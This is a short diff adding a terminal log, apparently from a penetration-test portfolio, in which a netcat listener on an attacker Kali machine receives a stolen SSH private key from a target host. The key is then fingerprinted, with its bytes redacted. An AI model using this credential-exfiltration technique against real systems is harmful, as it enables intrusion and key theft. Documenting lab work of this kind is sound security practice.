@@ -1,0 +1,9 @@
+[root@kali ~]# nc -lvnp 6666 > /tmp/id_ed25519
+listening on [any] 6666 ...
+connect to [10.20.40.10] from (UNKNOWN) [10.20.40.20] 54321
+^C
+[root@kali ~]# head -1 /tmp/id_ed25519
+-----BEGIN OPENSSH PRIVATE KEY-----
+[root@kali ~]# ssh-keygen -l -f /tmp/id_ed25519
+256 SHA256:AbCdEfGhIjKlMnOpQrStUvWxYz1234567890 (ED25519)
+# Note: Raw key bytes redacted for portfolio safety. Fingerprint matches authorized key on target.
